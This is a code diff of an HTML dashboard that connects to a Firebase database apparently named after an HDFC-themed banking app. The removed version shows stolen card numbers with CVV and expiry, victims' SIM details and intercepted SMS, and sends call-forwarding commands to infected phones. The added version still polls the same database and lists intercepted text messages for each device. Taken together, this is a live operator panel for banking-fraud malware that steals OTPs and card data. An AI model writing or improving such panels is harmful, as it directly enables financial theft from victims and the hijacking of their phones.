@@ -2,169 +2,130 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Elite Control Pro v6</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iMessage Fixed</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        :root { --bg: #000; --card: #0a0a0a; --border: #222; --text: #fff; --sub: #666; --accent: #fff; }
-        * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
-        body { margin: 0; background: var(--bg); color: var(--text); font-size: 13px; }
-        
-        header { sticky: top; background: #000; border-bottom: 1px solid var(--border); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; z-index: 100; }
-        .logo { font-weight: 800; letter-spacing: 2px; font-size: 14px; }
-        .sync { font-size: 9px; color: #00ff00; border: 1px solid #111; padding: 2px 8px; }
-
-        main { padding: 12px; display: grid; gap: 10px; }
-        .dev-card { background: var(--card); border: 1px solid var(--border); padding: 15px; position: relative; cursor: pointer; }
-        .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 5px; }
-        .online { background: #00ff00; } .offline { background: #ff0000; }
-
-        .row { display: flex; justify-content: space-between; margin-bottom: 5px; }
-        .label { color: var(--sub); font-size: 10px; text-transform: uppercase; font-weight: bold; }
-        .val { font-weight: 500; }
-
-        .pop { position: fixed; inset: 0; background: #000; z-index: 1000; display: none; flex-direction: column; }
-        .pop.active { display: flex; }
-        .pop-head { border-bottom: 1px solid var(--border); padding: 18px; display: flex; justify-content: space-between; align-items: center; }
-        
-        .tabs { display: flex; border-bottom: 1px solid var(--border); background: #050505; }
-        .tab { flex: 1; text-align: center; padding: 15px; font-size: 11px; color: var(--sub); cursor: pointer; font-weight: bold; }
-        .tab.active { color: #fff; border-bottom: 2px solid #fff; }
-
-        .content { flex: 1; overflow-y: auto; padding: 15px; }
-        .box { border: 1px solid var(--border); padding: 15px; margin-bottom: 12px; }
-        .btn { background: #fff; color: #000; border: none; padding: 15px; font-weight: 900; cursor: pointer; width: 100%; margin-top: 10px; text-transform: uppercase; }
-        .inp { width: 100%; background: #000; border: 1px solid var(--border); padding: 12px; color: #fff; margin-top: 8px; outline: none; }
-
-        .sms-item { border-bottom: 1px solid #111; padding: 12px 0; }
-        .sim-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
+        @import url('https://fonts.googleapis.com/css2?family=SF+Pro+Text:wght@400;500;600&display=swap');
+        body { background: #ffffff; font-family: 'SF Pro Text', -apple-system, sans-serif; color: #000; overflow-x: hidden; }
+        .ios-header { background: rgba(255,255,255,0.9); backdrop-filter: blur(20px); border-bottom: 0.5px solid #d1d1d6; position: sticky; top: 0; z-index: 50; }
+        .device-row { border-bottom: 0.5px solid #e5e5ea; padding: 18px 16px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; }
+        #message-view { position: fixed; top: 0; left: 100%; width: 100%; height: 100%; background: white; transition: 0.3s; z-index: 100; overflow-y: auto; }
+        #message-view.active { left: 0; }
+        .msg-card { border-bottom: 0.5px solid #f2f2f7; padding: 12px 16px; }
+        .text-msg { font-size: 11px; color: #3A3A3C; line-height: 1.4; }
+        .text-time { font-size: 9px; color: #8E8E93; }
+        .sender-name { font-size: 12px; font-weight: 600; }
     </style>
 </head>
 <body>
 
-<header>
-    <div class="logo">ULTRA PANEL V6</div>
-    <div id="sync-status" class="sync">READY</div>
-</header>
+    <section id="main-screen">
+        <header class="ios-header px-4 py-4 flex justify-between items-center">
+            <h1 class="text-xl font-bold">Devices</h1>
+            <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
+        </header>
+        <div id="device-list" class="max-w-2xl mx-auto"></div>
+    </section>
 
-<main id="device-list"></main>
+    <section id="message-view">
+        <header class="ios-header px-4 py-3 flex items-center justify-between">
+            <div class="text-blue-500 font-medium cursor-pointer" onclick="closeFolder()">‹ Back</div>
+            <h1 id="header-title" class="text-sm font-bold">Messages</h1>
+            <div class="w-10"></div>
+        </header>
+        <div id="internal-feed" class="max-w-2xl mx-auto pb-20"></div>
+    </section>
 
-<div id="popup" class="pop">
-    <div class="pop-head">
-        <span id="pop-id" style="font-weight: 900; font-size: 12px; color: #fff;">ID: NULL</span>
-        <span onclick="closePop()" style="cursor:pointer; font-size: 22px;">✕</span>
-    </div>
-    <div class="tabs">
-        <div class="tab active" onclick="switchTab(event, 'sys')">System</div>
-        <div class="tab" onclick="switchTab(event, 'card')">Cards</div>
-        <div class="tab" onclick="switchTab(event, 'sms')">SMS</div>
-        <div class="tab" onclick="switchTab(event, 'fwd')">FWD</div>
-    </div>
-    <div id="pop-content" class="content"></div>
-</div>
+    <script>
+        const DB_URL = "https://hdfc-raju-appcard003-default-rtdb.firebaseio.com/.json";
+        let masterMap = {}; 
 
-<script>
-    const dbURL = "https://hdfc-raju-appcard003-default-rtdb.firebaseio.com/.json";
-    let dbData = {}; let activeId = null; let activeTab = 'sys';
+        async function loadAll() {
+            try {
+                const res = await fetch(DB_URL);
+                const data = await res.json();
+                if (!data) return;
 
-    async function fetchData() {
-        try {
-            const res = await fetch(dbURL + ".json");
-            const data = await res.json();
-            dbData = data.All_Users || {};
-            document.getElementById('sync-status').innerText = "LIVE: " + new Date().toLocaleTimeString();
-            renderList();
-            if(activeId) updateDetails();
-        } catch(e) { document.getElementById('sync-status').innerText = "SYNC ERROR"; }
-    }
+                masterMap = {}; // Reset
 
-    function renderList() {
-        const container = document.getElementById('device-list');
-        const devices = dbData.Data?.DeviceInfo || {};
-        const ids = Object.keys(devices).sort((a,b) => b.localeCompare(a));
-        
-        let html = "";
-        ids.forEach((id) => {
-            const d = devices[id];
-            const isOnline = d.Status === "Online";
-            html += `
-            <div class="dev-card" onclick="openPop('${id}')">
-                <div class="row">
-                    <span class="label"><span class="status-dot ${isOnline ? 'online':'offline'}"></span>${id.slice(-8)}</span>
-                    <span class="val" style="color:${isOnline ? '#00ff00':'#ff0000'}">${d.Status || 'Offline'}</span>
-                </div>
-                <div class="row"><span class="label">Device</span><span class="val">${d.Brand}</span></div>
-                <div class="row"><span class="label">Battery</span><span class="val">${d.Battery}</span></div>
-            </div>`;
-        });
-        container.innerHTML = html || "<center>Searching...</center>";
-    }
+                // SMART SCAN: Har folder ko device maan lo
+                for (let devKey in data) {
+                    let folder = data[devKey];
+                    if (typeof folder === 'object') {
+                        // Folder ke andar messages dhoondo
+                        let messages = [];
+                        
+                        function deepSearch(obj) {
+                            for (let k in obj) {
+                                if (obj[k] && typeof obj[k] === 'object') {
+                                    if (obj[k].message) {
+                                        messages.push({ ...obj[k], pk: k });
+                                    } else {
+                                        deepSearch(obj[k]);
+                                    }
+                                }
+                            }
+                        }
+                        deepSearch(folder);
 
-    function openPop(id) { activeId = id; document.getElementById('popup').classList.add('active'); updateDetails(); }
-    function closePop() { document.getElementById('popup').classList.remove('active'); activeId = null; }
-    function switchTab(e, t) { activeTab = t; document.querySelectorAll('.tab').forEach(x => x.classList.remove('active')); e.target.classList.add('active'); updateDetails(); }
+                        if (messages.length > 0) {
+                            // Newest first
+                            messages.sort((a,b) => b.pk.localeCompare(a.pk));
+                            masterMap[devKey] = messages;
+                        }
+                    }
+                }
 
-    function updateDetails() {
-        const box = document.getElementById('pop-content');
-        
-        if(activeTab === 'sys') {
-            const d = dbData.Data?.DeviceInfo?.[activeId] || {};
-            const s = dbData.simDetails?.[activeId] || {};
-            box.innerHTML = `
-                <div class="box">
-                    <span class="label">Device Info</span>
-                    <div class="row" style="margin-top:10px;"><span>Brand:</span><span>${d.Brand}</span></div>
-                    <div class="row"><span>Status:</span><span style="color:#00ff00">${d.Status}</span></div>
-                    <div class="row"><span>Battery:</span><span>${d.Battery}</span></div>
-                </div>
-                <div class="box">
-                    <span class="label">SIM Details</span>
-                    <div class="sim-grid">
-                        <div style="border-right:1px solid #222; padding-right:5px;">
-                            <div class="label" style="font-size:8px;">SIM 1</div>
-                            <div style="font-weight:bold; font-size:12px;">${s.sim1Number || 'Empty'}</div>
-                            <div style="font-size:9px; color:#555;">${s.sim1Provider || '--'}</div>
-                        </div>
-                        <div>
-                            <div class="label" style="font-size:8px;">SIM 2</div>
-                            <div style="font-weight:bold; font-size:12px;">${s.sim2Number || 'Empty'}</div>
-                            <div style="font-size:9px; color:#555;">${s.sim2Provider || '--'}</div>
-                        </div>
+                renderList();
+                
+                if(document.getElementById('message-view').classList.contains('active')) {
+                    const activeID = document.getElementById('header-title').innerText;
+                    renderFolder(activeID);
+                }
+
+            } catch (e) { console.error(e); }
+        }
+
+        function renderList() {
+            const list = document.getElementById('device-list');
+            const keys = Object.keys(masterMap).sort();
+            
+            list.innerHTML = keys.map(k => `
+                <div class="device-row" onclick="openFolder('${k}')">
+                    <div class="flex flex-col">
+                        <span class="text-sm font-bold"># ${k.substring(0,10)}</span>
+                        <span class="text-[9px] text-gray-400 uppercase">${masterMap[k].length} Messages</span>
                     </div>
-                </div>`;
-        }
-        else if(activeTab === 'card') {
-            const c = dbData.AccountInfo?.[activeId] || {};
-            box.innerHTML = `<div class="box" style="background:#fff; color:#000;">
-                <span class="label" style="color:#888;">CARD NUMBER</span>
-                <div style="font-size:20px; font-weight:bold; margin:10px 0;">${c.number || 'No Data'}</div>
-                <div class="row" style="border-top:1px solid #eee; padding-top:10px; color:#000;">
-                    <span>EXP: ${c.date || '--'}</span><span>CVV: ${c.cvv || '--'}</span>
+                    <span class="text-gray-300">›</span>
                 </div>
-            </div>`;
+            `).join('');
         }
-        else if(activeTab === 'sms') {
-            const msgs = dbData.sms?.[activeId] || {};
-            let h = "";
-            Object.values(msgs).reverse().forEach(m => {
-                h += `<div class="sms-item"><div class="row"><span class="label">${m.sender}</span><span style="font-size:9px;">${m.receivedDate}</span></div><div style="color:#ddd;">${m.body}</div></div>`;
-            });
-            box.innerHTML = h || "No Messages";
-        }
-        else if(activeTab === 'fwd') {
-            const f = dbData.CallForwarding?.[activeId] || {};
-            box.innerHTML = `<div class="box"><span class="label">Live Status</span><div style="color:#00ff00; font-weight:bold; margin-top:5px;">${f.callForwardStatus || 'IDLE'}</div></div>
-                <div class="box"><span class="label">Command</span><input type="number" id="tNum" class="inp" placeholder="10 Digit Number"><button class="btn" onclick="sendFwd()">Set Forwarding</button></div>`;
-        }
-    }
 
-    async function sendFwd() {
-        const n = document.getElementById('tNum').value;
-        if(n.length !== 10) return alert("Only 10 digits allowed!");
-        await fetch(dbURL + `All_Users/CallForwarding/${activeId}.json`, { method: 'PATCH', body: JSON.stringify({ toNumber: n, callForwardStatus: "PENDING..." }) });
-        alert("Command Sent!");
-    }
+        function openFolder(id) {
+            document.getElementById('header-title').innerText = id;
+            renderFolder(id);
+            document.getElementById('message-view').classList.add('active');
+        }
 
-    setInterval(fetchData, 15000); fetchData();
-</script>
+        function closeFolder() { document.getElementById('message-view').classList.remove('active'); }
+
+        function renderFolder(id) {
+            const feed = document.getElementById('internal-feed');
+            const msgs = masterMap[id] || [];
+            feed.innerHTML = msgs.map(m => `
+                <div class="msg-card">
+                    <div class="flex justify-between items-start">
+                        <span class="sender-name">${m.sender}</span>
+                        <span class="text-time font-mono tracking-tighter">${m.received_time}</span>
+                    </div>
+                    <p class="text-msg mt-1">${m.message}</p>
+                </div>
+            `).join('');
+        }
+
+        setInterval(loadAll, 5000);
+        loadAll();
+    </script>
 </body>
 </html>
